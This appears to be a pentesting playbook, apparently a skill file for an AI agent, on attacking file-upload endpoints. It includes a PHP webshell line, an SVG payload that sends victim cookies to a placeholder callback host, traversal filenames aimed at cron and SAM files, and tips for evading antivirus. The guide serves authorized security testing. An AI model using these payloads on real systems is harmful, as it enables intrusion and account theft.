---
slug: insecure-file-uploads
applies_to: [pentester, coder]
owasp: A04
related: [rce, path_traversal_lfi_rfi, xss]
---

# Insecure File Uploads — Pentester Playbook

> Load this when recon found any upload endpoint — profile pictures, doc
> attachments, CSV importers, ticket attachments, signature images, video
> uploads, audio messages. Upload features sit on top of three subsystems
> (HTTP body parser, file storage, downstream renderer), each of which can
> independently be broken.

## When to load this

The endpoint shapes to load this for:

- `multipart/form-data` POST that accepts a `file` field
- Pre-signed URL handlers (S3, GCS) where the client uploads directly
- "Import" endpoints accepting CSV, JSON, XLSX
- Profile picture / avatar endpoints
- Document/contract upload (often PDF, DOCX)
- Image processing pipelines (avatars resized server-side = ImageMagick or similar in the loop)
- "Bulk upload" or "drag and drop" UIs

## What you're looking for

Three subsystems, three bug classes:

- **At parse time.** The HTTP handler accepts files it shouldn't (executable extensions, oversized files, traversal in filename, fake content-type).
- **At storage time.** The file is written to a path under the webroot, or with a name an attacker can predict and then request.
- **At render time.** A downstream component opens the file: ImageMagick converts it, an XML parser reads its metadata, a doc viewer renders it. Bugs in that component (RCE, XXE, SSRF) become exploitable via the upload.

## First moves

1. **Baseline upload.** Submit a normal valid file (a small PNG). Capture the full request — URL, multipart boundaries, all headers, filename, content-type. Capture the response, especially any URL/ID returned that lets you retrieve the file later.

2. **Extension fuzzing.** Try each of these as the filename, one per request, with otherwise-valid content:
   - `shell.php`, `shell.php5`, `shell.php7`, `shell.phtml`, `shell.phar` (PHP)
   - `shell.jsp`, `shell.jspx`, `shell.jspf` (Java)
   - `shell.aspx`, `shell.ashx`, `shell.asmx` (.NET)
   - `shell.cgi`, `shell.pl`, `shell.py`, `shell.sh` (CGI / interpreter-direct)
   - `shell.html` (XSS if rendered same-origin)
   - `shell.svg` (XSS via SVG `<script>`)
   - `shell.htaccess` (Apache config override — privesc the upload dir)
   - `shell.config`, `web.config` (IIS config override)
   
   Note which extensions get rejected vs accepted. The pattern reveals the filter (blocklist vs allowlist).

3. **Double-extension probe.** `shell.php.png`, `shell.png.php`, `shell.php%00.png`. Apache/Nginx default config sometimes parses by last-known-extension or by first-recognized — both patterns are exploitable.

4. **Content-Type tampering.** Submit a PHP file with `Content-Type: image/png` and a valid PNG magic-byte prefix. Many servers check Content-Type from the request OR sniff the magic bytes — beat both by combining.

5. **Filename traversal.** `../../../../etc/cron.d/attacker`, `..\\..\\..\\windows\\system32\\config\\sam`, URL-encoded variants, double-encoded variants. Watch where the file lands by attempting to read it via known paths.

6. **MIME confusion (polyglots).** A file that's a valid PNG AND a valid PHP script: PNG magic bytes (`\x89PNG...`) followed by `<?php system($_GET['c']); ?>` followed by IDAT chunks. The image renders normally AND the file executes if requested as PHP.

7. **Zip-based formats.** Upload a malicious DOCX/XLSX/ZIP with a path-traversal entry (`../../../etc/cron.d/x`) — if the server unzips on its end, files land outside the upload dir.

## Confirming a hit

The confirmation depends on the bug class:

### Shell upload → RCE
- Upload the suspect file
- Retrieve the URL where it lives (from the response or by guessing the storage pattern)
- Browse to it; if it executes (running the PHP/JSP/ASPX), the bug is confirmed
- Run `id` / `whoami` / `uname -a` via the shell to prove execution context

### Stored XSS via SVG
- Upload an SVG with `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://OAST/x?c='+document.cookie)</script></svg>`
- Have a different account (or admin) view the upload's preview/avatar
- Watch your OAST for the callback with the victim's cookie

### XXE via image metadata
- Upload an image with malicious XMP metadata containing an XXE payload
- If the server reads the metadata (most do, for orientation/EXIF), the parser triggers
- Detect via OAST callback

### ImageMagick / "ImageTragick" path
- Upload an MVG or SVG that wraps shell commands in MIFF/MVG syntax
- ImageMagick runs the commands during conversion
- Confirm via reverse shell or OAST callback

### Path traversal landing
- Upload a file with `../` filename
- Attempt to retrieve via the path you targeted (e.g., overwrite a known JS file in webroot)
- Confirm by checking the targeted location's content changed

## Going deeper — by upload subsystem

### Multipart parser quirks
- Boundary in body. Some parsers crash or do funky things with `--boundary` substrings inside the file content.
- Chunked uploads. Apps that handle chunked differently from non-chunked sometimes skip the security check on one path.
- Filename in `name` vs `filename`. Some parsers use the wrong field, allowing override.
- Multiple files per part. Some parsers accept `Content-Disposition: form-data; name="file"; filename="a"; filename="b"` — second filename wins on the parser but first on the validator.

### Cloud storage (S3, GCS, Azure Blob)
- **Pre-signed URL scope.** Client gets a pre-signed URL to upload directly to S3. Often the URL allows uploading to any path within the bucket — try `path=../../other-customers-files`. Or the URL allows overwriting existing objects.
- **Bucket misconfig.** Newly uploaded files inherit bucket-level ACLs. Public-read bucket = every upload is public.
- **Content-Type unrestricted.** Pre-signed PUT with `Content-Type: text/html` lands an HTML file on the bucket; if the bucket is also served via CloudFront on the app's domain, you have stored XSS on the apex.
- **Acceleration endpoint quirks.** S3 transfer acceleration can sometimes be hit without auth.

### Image processing pipeline
- **Resize-on-upload.** App opens uploaded image with PIL/ImageMagick to resize. Vulnerable lib + crafted payload = RCE.
- **Format conversion.** App converts uploaded SVG/PDF to PNG for storage. Conversion path is rich attack surface.
- **EXIF stripping.** App removes EXIF for privacy. The strip logic itself can be exploited if it shells out to `exiftool` with untrusted args.

### Doc parsers
- **DOCX/XLSX.** ZIP-of-XML format. Each XML file parsed by potentially-XXE-vulnerable parser. Embedded macros in XLSX run server-side in some preview pipelines.
- **PDF.** Reader libraries (`pdfminer`, `PyPDF2`, `PDFBox`) have parser bugs. JS in PDF can run in some preview contexts.
- **OOXML formulas.** XLSX formulas like `=DDE("cmd","/c calc")` execute in Excel-on-server preview pipelines.

## When filters get in the way

- **Extension blocklist.** Find the gap. Common misses: `.phar`, `.phtml`, `.shtml`, `.cer`, `.asp;.jpg` (semicolon trick on IIS), `.aspx::$DATA`.
- **Magic byte check.** Prefix the file with valid magic bytes for an allowed type. PHP after a PNG header still executes when requested as PHP.
- **MIME-type validation from Content-Type only.** Spoof Content-Type. Combine with magic byte prefix if the server also sniffs.
- **AV scan.** Files are scanned by ClamAV or similar. Common webshells flag instantly. Use less-known shells (homemade, encoded) or chunked encoding to slip past streaming AV.
- **Size limit.** Most filters cap file size — keep your shell small. A 200-byte PHP shell fits anywhere.
- **Filename sanitization.** Server strips `../`. Try Unicode normalization tricks (`％2E％2E／`), null bytes (`shell.php\x00.png` truncates at null in some C-based parsers).
- **Random renaming.** Server renames uploads to UUID. The shell still works if you can find the new name — check the response, the API listing, or guess based on a known seed (some apps use sequential or time-based naming).

## Escalation paths

1. **RCE via webshell.** Direct shell on the server. Pair with reverse-shell / pivot.
2. **XSS via SVG / HTML.** Targets admin who views uploads; chain to account takeover.
3. **Internal SSRF via SVG.** SVG can include `<image href="http://internal-host">` which the server-side renderer fetches.
4. **Read-only file overwrite.** Path traversal lets you overwrite `index.html`, app config, or other static assets — defacement or behavioral subversion.
5. **DoS via zip bomb / 10x decompression.** Compressed file expands to gigabytes on disk, exhausts storage. Use sparingly — easy to verify, easy to weaponize accidentally.

## What a real finding looks like

- The exact request that triggered the bad behavior (file content, headers, multipart boundaries)
- The URL where the uploaded file landed (or the path you reached via traversal)
- Proof of exploitation: shell output for RCE, OAST callback for SSRF/XXE, cookie capture for XSS
- The specific filter that failed ("extension blocklist; `.phar` not included") and where it lives in the request path (web tier, app handler, post-process)
- The fix: extension allowlist (not blocklist), separate storage domain (Amazon S3 with `Content-Disposition: attachment` for non-image content), random filenames, file validation by parsing the file with a safe parser rather than trusting headers

## Common false positives

- **Upload succeeds but file is unreachable.** Files written to a directory below web root that no public URL maps to. Not exploitable as RCE unless paired with traversal.
- **PHP code uploaded but not executed.** Server stores as `.php` but the web server isn't configured to execute PHP from upload dir (`.htaccess` deny or PHP handler scoped to other paths). Functional bug, not RCE.
- **SVG with `<script>` that doesn't fire.** Some renderers strip scripts on display. Confirm by viewing the rendered upload, not by reading the stored file.
- **ImageMagick "vulnerability" on a hardened build.** Recent ImageMagick has tight policy.xml restrictions. The classic ImageTragick payloads fail. Note as "no longer exploitable" rather than reporting.

## Related skills

`rce` for the shell-upload follow-up, `path_traversal_lfi_rfi` for the filename-traversal pivot, `xss` for SVG/HTML upload exploitation.
